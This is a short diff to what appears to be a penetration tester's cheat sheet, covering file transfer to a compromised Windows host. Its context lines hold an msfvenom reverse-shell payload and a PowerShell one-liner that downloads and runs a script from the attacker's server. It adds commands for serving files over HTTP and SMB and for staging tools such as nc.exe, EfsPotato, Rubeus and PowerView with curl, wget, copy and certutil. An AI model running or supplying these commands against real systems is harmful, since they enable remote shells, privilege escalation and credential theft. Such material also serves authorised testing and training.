@@ -1433,7 +1433,11 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
 
 [*] File Transfer
-reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+-->> Serve
+python3 -m http.server 8888 /Upload
+impacket-smbserver share /Upload/windows
+
+-->> Transfer
 curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
 curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 curl http://$MYIP:8888/windows/PowerView.ps1 -o \programdata\PowerView.ps1
@@ -1441,6 +1445,7 @@ curl http://$MYIP:8888/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
 curl http://$MYIP:8888/windows/Rubeus.exe -o \programdata\Rubeus.exe
 curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+copy \\$MYIP\share\nc.exe \programdata
 certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
